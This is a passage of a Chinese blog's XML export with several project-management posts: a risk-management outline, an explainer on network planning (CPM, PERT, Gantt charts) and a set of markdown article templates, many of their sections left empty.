<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><h4 id="问题一：招聘"><a href="#问题一：招聘" class="headerlink" title="问题一：招聘"></a>问题一：招聘</h4><h4 id="问题二：团建"><a href="#问题二：团建" class="headerlink" title="问题二：团建"></a>问题二：团建</h4><h4 id="问题三：协作"><a href="#问题三：协作" class="headerlink" title="问题三：协作"></a>问题三：协作</h4><h4 id="问题四：文档"><a href="#问题四：文档" class="headerlink" title="问题四：文档"></a>问题四：文档</h4><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="领导方式"><a href="#领导方式" class="headerlink" title="领导方式"></a>领导方式</h4><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>教练 Coaching</td>
<td></td>
<td></td>
</tr>
<tr>
<td>支持 Supporting</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/" target="_blank" rel="noopener">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/" target="_blank" rel="noopener">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/" target="_blank" rel="noopener">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/vR6jkzA4Uq0CiqoNLUwGVw" target="_blank" rel="noopener">【情报论文】9.11后美国情报分析师的培训和教育</a></li>
<li><a href="https://mp.weixin.qq.com/s/9oRuaq29_5LSBKsqyxvHlw" target="_blank" rel="noopener">美国陆军的兵力生成与管理 | 知远战略与防务研究所  2月2日</a></li>
<li><a href="https://mp.weixin.qq.com/s/wJMiHVKGyuKU_TEN-sbw9g" target="_blank" rel="noopener">2019年美军最新工资结构分析</a></li>
<li><a href="https://mp.weixin.qq.com/s/Imc3ci5XddgA6IYZyIlqNQ" target="_blank" rel="noopener">十年创业老兵谈人才招聘：瘦鹅理论 | 原创： 宋杰  技术琐话</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:项目风险管理</title>
    <url>/2018/06/05/Project-Risk/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li>What is Risk ?</li>
</ul>
<p>风险是损失或收益发生的不确定性。风险通常指一定时期内，某一事件的预期结果与实际结果的变动程度，变动程度越大，风险越大。</p>
<h2 id="How-to-Manage-Risk"><a href="#How-to-Manage-Risk" class="headerlink" title="How to Manage Risk"></a>How to Manage Risk</h2><h4 id="Risk-Management-Framework"><a href="#Risk-Management-Framework" class="headerlink" title="Risk Management Framework"></a>Risk Management Framework</h4><h4 id="Risk-Management-Plan"><a href="#Risk-Management-Plan" class="headerlink" title="Risk Management Plan"></a>Risk Management Plan</h4><h4 id="Risk-Identification"><a href="#Risk-Identification" class="headerlink" title="Risk Identification"></a>Risk Identification</h4><h4 id="Risk-Response-Planning"><a href="#Risk-Response-Planning" class="headerlink" title="Risk Response Planning"></a>Risk Response Planning</h4><h2 id="Managing-Risk-throughout-the-Organization"><a href="#Managing-Risk-throughout-the-Organization" class="headerlink" title="Managing Risk throughout the Organization"></a>Managing Risk throughout the Organization</h2><h2 id="Risk-Analysis"><a href="#Risk-Analysis" class="headerlink" title="Risk Analysis"></a>Risk Analysis</h2><h4 id="Risk-Efficiency-measurement"><a href="#Risk-Efficiency-measurement" class="headerlink" title="Risk Efficiency measurement"></a>Risk Efficiency measurement</h4><h4 id="Risk-Metrics"><a href="#Risk-Metrics" class="headerlink" title="Risk Metrics"></a>Risk Metrics</h4><h4 id="Risk-Audit"><a href="#Risk-Audit" class="headerlink" title="Risk Audit"></a>Risk Audit</h4><h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="可靠性工程-Overview-of-Reliability"><a href="#可靠性工程-Overview-of-Reliability" class="headerlink" title="可靠性工程 | Overview of Reliability"></a><a href="https://riboseyim.github.io/2020/01/02/Engineering-RAMS/" target="_blank" rel="noopener">可靠性工程 | Overview of Reliability</a></h4><ul>
<li>失效分析</li>
<li>可靠性设计</li>
<li>安全性设计</li>
<li>风险评估</li>
</ul>
<h4 id="项目管理-Overview-of-Project-Management"><a href="#项目管理-Overview-of-Project-Management" class="headerlink" title="项目管理 | Overview of Project Management"></a><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></h4><ul>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/" target="_blank" rel="noopener">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/" target="_blank" rel="noopener">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/" target="_blank" rel="noopener">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://en.wikipedia.org/wiki/Project_risk_management" target="_blank" rel="noopener">维基百科：Project risk management</a></li>
<li><a href="https://www.projectsmart.co.uk/10-golden-rules-of-project-risk-management.php" target="_blank" rel="noopener">10 GOLDEN RULES OF PROJECT RISK MANAGEMENT | ~ By Bart Jutte</a></li>
<li><a href="https://www.pmi.org/learning/library/risk-analysis-project-management-7070" target="_blank" rel="noopener">Risk analysis and management | a vital key to effective project management | 3 March 2008 Lavanya, N. | Malarvizhi, T.</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:网络计划技术|工具与技术</title>
    <url>/2019/05/29/Project-Tech-NetworkPlanning/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><h4 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h4><h4 id="History"><a href="#History" class="headerlink" title="History"></a>History</h4><p>网络计划技术是一种用于工程项目计划与控制的管理技术。起源于五十年代末发展起来的关键路径法（CPM）与计划评审法（PERT）。鉴于技术起源和设计目的，业内一般将 CPM 应用于已取得一定经验的承包工程，而研究与开发项目则更多地应用 PERT 。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>工具</th>
<th>起源</th>
<th>时间</th>
<th>成本</th>
<th>质量</th>
<th>费用</th>
</tr>
</thead>
<tbody>
<tr>
<td>甘特图</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>关键路径法/CPM</td>
<td>1957，美国杜邦公司/兰德公司</td>
<td>weak</td>
<td>strong</td>
<td>weak</td>
<td>strong</td>
</tr>
<tr>
<td>技术评审技术/PERT</td>
<td>1958，美国海军/洛克希德，潜射核导弹</td>
<td>strong</td>
<td>weak</td>
<td>strong</td>
<td>weak</td>
</tr>
</tbody>
</table>
</div>
<h5 id="甘特图（Gantt-Chart）"><a href="#甘特图（Gantt-Chart）" class="headerlink" title="甘特图（Gantt Chart）"></a>甘特图（Gantt Chart）</h5><p>发明人：亨利 ·甘特(Henry Gatt)</p>
<h5 id="关键路径法-Critical-Path-Method-CPM"><a href="#关键路径法-Critical-Path-Method-CPM" class="headerlink" title="关键路径法(Critical Path Method,CPM)"></a>关键路径法(Critical Path Method,CPM)</h5><p>关键路径法（CPM）是由美国杜邦公司和兰德公司与1957年联合研究提出的，它假设每项活动的作业时间是确定值，重点在于费用和成本的控制。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniPlan.png" alt=""></p>
<h5 id="计划评审技术-Project-Evaluation-and-Review-Technique-PERT"><a href="#计划评审技术-Project-Evaluation-and-Review-Technique-PERT" class="headerlink" title="计划评审技术(Project Evaluation and Review Technique,PERT)"></a>计划评审技术(Project Evaluation and Review Technique,PERT)</h5><p>项目评估与审查技术（Project Evaluation and Review Technique,PERT）由美国海军首次提出，并于1958年由 Booz、Allen 和 Hamilton 的咨询公司开发。最早的用途是协调涉及北极星导弹研发计划的 10 000 多个分包商的活动。PERT 类似关键路径方法(CPM)，是一种用于优化和调度复杂的、相关关联的活动的方法。</p>
<h2 id="Introduction-网络计划技术简介"><a href="#Introduction-网络计划技术简介" class="headerlink" title="Introduction | 网络计划技术简介"></a>Introduction | 网络计划技术简介</h2><p>网络计划技术（Network Planning Technology）</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Tool-%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E6%8A%80%E6%9C%AF.png" alt=""></p>
<h2 id="Core-Concept-核心概念"><a href="#Core-Concept-核心概念" class="headerlink" title="Core Concept | 核心概念"></a>Core Concept | 核心概念</h2><h4 id="Concept-网络图"><a href="#Concept-网络图" class="headerlink" title="Concept 网络图"></a>Concept 网络图</h4><p>网络图是指网络计划技术的图解模型，反映整个工程任务的分解和合成。</p>
<h4 id="Concept-时间参数"><a href="#Concept-时间参数" class="headerlink" title="Concept 时间参数"></a>Concept 时间参数</h4><p>各项工作中反映人、事、物运动状态的时间参数包括：</p>
<ul>
<li>作业时间</li>
<li>开工与完工的时间</li>
<li>工作之间的衔接时间</li>
<li>完成任务的机动时间</li>
<li>工程范围</li>
<li>总工期</li>
</ul>
<h4 id="Concept-关键路线"><a href="#Concept-关键路线" class="headerlink" title="Concept 关键路线"></a>Concept 关键路线</h4><p>在关键路线上的作业称为关键作业，这些作业完成的快慢直接影响着整个计划的工期。在计划执行过程中关键作业是管理的重点，在时间和费用方面则要严格控制。</p>
<h4 id="Concept-网络优化"><a href="#Concept-网络优化" class="headerlink" title="Concept 网络优化"></a>Concept 网络优化</h4><p>网络优化是指根据关键路线法，通过利用时差，不断改善网络计划的初始方案，在满足一定的约束条件下，寻求管理目标达到最优化的计划方案。</p>
<h4 id="实施步骤"><a href="#实施步骤" class="headerlink" title="实施步骤"></a>实施步骤</h4><p>网络计划技术的应用主要遵循以下几个步骤：</p>
<ul>
<li>1、确定目标；</li>
<li>2、分解工程项目，列出作业明细表；</li>
<li>3、绘制网络图，进行结点编号；主要方法：1）顺推法（起始时间开始）；2）逆推法（从终点时间开始）</li>
<li>4、计算网络时间，确定关键路线；根据网络图和各项活动的作业时间计算出全部网络时间和时差，并确定关键线路。在实际工作中，作业种类多、影响计划的因素也很多，因此通常需要依靠计算机对计划进行调整。</li>
<li>5、网络计划方案优化；根据关键路径，综合平衡总工期、人力资源、物资供应、成本费用等情况，制定最优方案。正式绘制网络图，编制进度表以及工程预算等计划文件。</li>
<li>6、网络计划执行</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>作业名称</th>
<th>作业代号</th>
<th>作业时间</th>
<th>紧前时间</th>
<th>紧后时间</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h2 id="Best-Practice-最佳实践"><a href="#Best-Practice-最佳实践" class="headerlink" title="Best Practice | 最佳实践"></a>Best Practice | 最佳实践</h2><h4 id="Microsoft-Office-Project"><a href="#Microsoft-Office-Project" class="headerlink" title="Microsoft Office Project"></a>Microsoft Office Project</h4><h4 id="OmniGroup-OmniPlan"><a href="#OmniGroup-OmniPlan" class="headerlink" title="OmniGroup OmniPlan"></a>OmniGroup OmniPlan</h4><h2 id="Future：Beyond-the-Network"><a href="#Future：Beyond-the-Network" class="headerlink" title="Future：Beyond the Network"></a>Future：Beyond the Network</h2><h2 id="阅读作业"><a href="#阅读作业" class="headerlink" title="阅读作业"></a>阅读作业</h2><h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://web.archive.org/web/20071019072438/http://www.lockheedmartin.com/products/Polaris/index.html">北极星导弹项目主页</a></li>
<li><a href="https://www.cnblogs.com/wangfupeng1988/p/3647166.html">如何有效使用Project（1）——编制进度计划、保存基准</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:项目管理开局模板|工具与技术</title>
    <url>/2018/06/19/Project-Template/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>学习范式</li>
<li>写作范式</li>
<li>输出范式</li>
</ul>
<blockquote>
<p>探索在本质上是分散行动，并通过一种可扩展的通信机制来协调整体行为。—《大教堂与集市》</p>
</blockquote>
<span id="more"></span>
<h2 id="范式1：主题式"><a href="#范式1：主题式" class="headerlink" title="范式1：主题式"></a>范式1：主题式</h2><h4 id="1-1-主题式-推荐解决方案"><a href="#1-1-主题式-推荐解决方案" class="headerlink" title="1.1 主题式/推荐解决方案"></a>1.1 主题式/推荐解决方案</h4><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">## 摘要</span></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br><span class="line"><span class="section">## Background</span></span><br><span class="line"><span class="section">#### Question</span></span><br><span class="line"><span class="section">#### Theory</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Introduction | XX简介</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Core Concept | 核心概念  </span></span><br><span class="line"></span><br><span class="line"><span class="section">#### Concept A</span></span><br><span class="line"><span class="section">#### Concept B</span></span><br><span class="line"><span class="section">#### Concept C</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Architecture Overview</span></span><br><span class="line"><span class="section">#### Files Tree</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Best Practice | XX 最佳实践</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Future：Beyond the XXX</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 阅读作业</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 拓展阅读</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 参考文献</span></span><br></pre></td></tr></table></figure>
<h4 id="1-2-主题式-开放式解决方案"><a href="#1-2-主题式-开放式解决方案" class="headerlink" title="1.2 主题式/开放式解决方案"></a>1.2 主题式/开放式解决方案</h4><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">## 摘要</span></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br><span class="line"><span class="section">## Background</span></span><br><span class="line"></span><br><span class="line"><span class="section">#### Question</span></span><br><span class="line"></span><br><span class="line"><span class="section">#### Overview Current Solutions</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> solution 1. 利/弊</span><br><span class="line"><span class="bullet">-</span> solution 2. 利/弊</span><br><span class="line"><span class="bullet">-</span> solution 3. 利/弊</span><br><span class="line"></span><br><span class="line"><span class="section">## Introduction XXXX Solution (New)</span></span><br><span class="line"></span><br><span class="line"><span class="section">#### Overview of XXXX Theory</span></span><br><span class="line"></span><br><span class="line"><span class="section">##### Concept A | 核心概念  </span></span><br><span class="line"><span class="section">##### Concept B | 核心概念  </span></span><br><span class="line"><span class="section">##### Concept C | 核心概念  </span></span><br><span class="line"></span><br><span class="line"><span class="section">## Overview of XXXX Practice （最佳实践）</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Future：Beyond the XXX</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 阅读作业</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 拓展阅读</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 参考文献</span></span><br></pre></td></tr></table></figure>
<h2 id="范式2：网络协议"><a href="#范式2：网络协议" class="headerlink" title="范式2：网络协议"></a>范式2：网络协议</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">## XX 协议简介 | Introduction</span></span><br><span class="line"><span class="bullet">-</span> [<span class="string">RFC no</span>](<span class="link">\#</span>)</span><br><span class="line"><span class="bullet">-</span> [<span class="string">RFC no</span>](<span class="link">\#</span>)</span><br><span class="line"><span class="section">## Core Concept | 核心概念</span></span><br><span class="line"><span class="section">#### Concept A</span></span><br><span class="line"><span class="section">#### Concept B</span></span><br><span class="line"><span class="section">#### Concept C</span></span><br><span class="line"><span class="section">## Architecture Overview</span></span><br><span class="line"><span class="section">#### Files Tree</span></span><br><span class="line"><span class="section">## Best Practice | XX 最佳实践</span></span><br></pre></td></tr></table></figure>
<h2 id="范式3：翻译文章"><a href="#范式3：翻译文章" class="headerlink" title="范式3：翻译文章"></a>范式3：翻译文章</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## Title</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 原标题：Seven Things to Know about Technical Writing at Uber</span><br><span class="line"><span class="bullet">-</span> 链接：[https://eng.uber.com/technical-writing-uber/]</span><br><span class="line"><span class="bullet">-</span> 作者：Shannon Brown</span><br><span class="line"><span class="bullet">-</span> 发表时间：October 3, 2018</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="范式4：系列文章"><a href="#范式4：系列文章" class="headerlink" title="范式4：系列文章"></a>范式4：系列文章</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">This article is part of an <span class="strong">**Distributed Tracing and Monitoring System**</span> tutorial series. Make sure to check out my other articles as well:</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> [<span class="string">DevOps 漫谈：分布式追踪系统体系概要</span>](<span class="link">https://riboseyim.github.io/2018/05/18/DevOps-OpenTracing/</span>)</span><br><span class="line"><span class="bullet">-</span> [<span class="string">DevOps 漫谈：开源分布式跟踪系统 OpenCensus</span>](<span class="link">https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus</span>)</span><br></pre></td></tr></table></figure>
<h2 id="范式5：书籍目录"><a href="#范式5：书籍目录" class="headerlink" title="范式5：书籍目录"></a>范式5：书籍目录</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 情报驱动应急响应</span></span><br><span class="line"><span class="bullet">-</span> Intelligence-Driven Incident Response: Outwitting the Adversary</span><br><span class="line"><span class="section">## 序言</span></span><br><span class="line"><span class="section">## 前言</span></span><br><span class="line"><span class="section"># 第一部分 基础知识</span></span><br><span class="line"><span class="section">## 第 1 章 概述</span></span><br><span class="line"><span class="section">#### 1.1.1 网络威胁情报的历史 History</span></span><br><span class="line"><span class="section">#### 1.1.2 现代网络威胁情报</span></span><br><span class="line"><span class="section">#### 1.1.3 未来之路 Future</span></span><br><span class="line"><span class="section">#### 1.2 什么是情报驱动的事件响应 What</span></span><br><span class="line"><span class="section">#### 1.4 为什么是情报驱动的事件响应 Why</span></span><br><span class="line"><span class="section">## 第 2 章 情报原则</span></span><br><span class="line"><span class="section">## 第 3 章 事件响应原则</span></span><br><span class="line"><span class="section"># 第二部分 实战篇</span></span><br><span class="line"><span class="section">## 第 4 章 查找</span></span><br><span class="line"><span class="section">## 第 5 章 定位</span></span><br><span class="line"><span class="section">## 第 6 章 消除</span></span><br><span class="line"><span class="section">## 第 7 章 利用</span></span><br><span class="line"><span class="section">## 第 8 章 分析</span></span><br><span class="line"><span class="section">## 第 9 章 传播</span></span><br><span class="line"><span class="section"># 第三部分 未来之路</span></span><br><span class="line"><span class="section">## 第 10 章 战略情报</span></span><br><span class="line"><span class="section">## 第 11 章 建立情报计划</span></span><br><span class="line"><span class="section"># 附录</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="范式6：表格结构"><a href="#范式6：表格结构" class="headerlink" title="范式6：表格结构"></a>范式6：表格结构</h2><div class="table-container">
<table>
<thead>
<tr>
<th>项目</th>
<th>属性A</th>
<th>属性B</th>
<th>属性C</th>
</tr>
</thead>
<tbody>
<tr>
<td>数据1</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>数据2</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>数据3</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<table>
   <tr>
      <td>项目</td>
      <td>属性A</td>
      <td>属性B</td>
      <td colspan="2" align="center">属性C</td>
   </tr>
   <tr>
      <td><a href="https://riboseyim.com" target="\_blank">数据11</a></td>
      <td>数据12</td>
      <td>数据13</td>
      <td>数据14</td>
      <td>数据15</td>
   </tr>
   <tr>
      <td>数据21</td>
      <td>数据22</td>
      <td>数据23</td>
      <td>数据24</td>
      <td>数据25</td>
   </tr>
   <tr>
      <td rowspan="2">数据31</td>
      <td>数据32</td>
      <td>数据33</td>
      <td>数据34</td>
      <td>数据35</td>
   </tr>
   <tr>
      <td>数据42</td>
      <td>数据43</td>
      <td>数据44</td>
      <td>数据45</td>
   </tr>
</table>

<h2 id="范式7：树形结构"><a href="#范式7：树形结构" class="headerlink" title="范式7：树形结构"></a>范式7：树形结构</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|—— root</span><br><span class="line">|   |—— dir 2</span><br><span class="line">|   |   |——dir 2-1</span><br><span class="line">|   |   |——dir 2-2</span><br><span class="line">|   |   |__dir 2-3</span><br><span class="line">|   |—— dir 3</span><br><span class="line">|   |   |——dir 3-1</span><br><span class="line">|   |   |——dir 3-2</span><br><span class="line">|   |   |__dir 3-3</span><br><span class="line">|   |__ file.md</span><br></pre></td></tr></table></figure>
<h2 id="范式8：事件简报"><a href="#范式8：事件简报" class="headerlink" title="范式8：事件简报"></a>范式8：事件简报</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 事件名称</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 摘要</span></span><br><span class="line"></span><br><span class="line">&gt;a</span><br><span class="line">&gt;b</span><br><span class="line">&gt;c</span><br><span class="line"></span><br><span class="line"><span class="section">## 时间线</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 2019-01-01 xxxxx</span><br><span class="line"><span class="bullet">-</span> 2019-01-11 xxxxx</span><br><span class="line"><span class="bullet">-</span> 2019-02-01 xxxxx</span><br><span class="line"></span><br><span class="line"><span class="section">## 影响</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 意见建议</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 建议1</span><br><span class="line"><span class="bullet">-</span> 建议2</span><br><span class="line"><span class="bullet">-</span> 建议3</span><br><span class="line"></span><br><span class="line"><span class="section">## 正在采取的行动</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 参考资料</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="范式9：研究课题"><a href="#范式9：研究课题" class="headerlink" title="范式9：研究课题"></a>范式9：研究课题</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 课题名称</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 摘要</span></span><br><span class="line"></span><br><span class="line">&gt;a</span><br><span class="line">&gt;b</span><br><span class="line">&gt;c</span><br><span class="line"></span><br><span class="line"><span class="section">## 里程碑目标</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 2019-01-01 xxxxx</span><br><span class="line"><span class="bullet">-</span> 2019-01-11 xxxxx</span><br><span class="line"><span class="bullet">-</span> 2019-02-01 xxxxx</span><br><span class="line"></span><br><span class="line"><span class="section">## 阅读作业</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 作业1</span><br><span class="line"><span class="bullet">-</span> 作业2</span><br><span class="line"><span class="bullet">-</span> 作业3</span><br><span class="line"></span><br><span class="line"><span class="section">## 理论成果</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 成果1</span><br><span class="line"><span class="bullet">-</span> 成果2</span><br><span class="line"><span class="bullet">-</span> 成果3</span><br><span class="line"></span><br><span class="line"><span class="section">## 工程实践</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 实践1</span><br><span class="line"><span class="bullet">-</span> 实践2</span><br><span class="line"><span class="bullet">-</span> 实践3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="范式10：Flow-Chart"><a href="#范式10：Flow-Chart" class="headerlink" title="范式10：Flow Chart"></a>范式10：Flow Chart</h2><h4 id="10-1-Flow-Chart-Dot"><a href="#10-1-Flow-Chart-Dot" class="headerlink" title="10.1 Flow Chart Dot"></a>10.1 Flow Chart Dot</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digraph flow&#123;</span><br><span class="line">  a-&gt;b;</span><br><span class="line">  b-&gt;c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
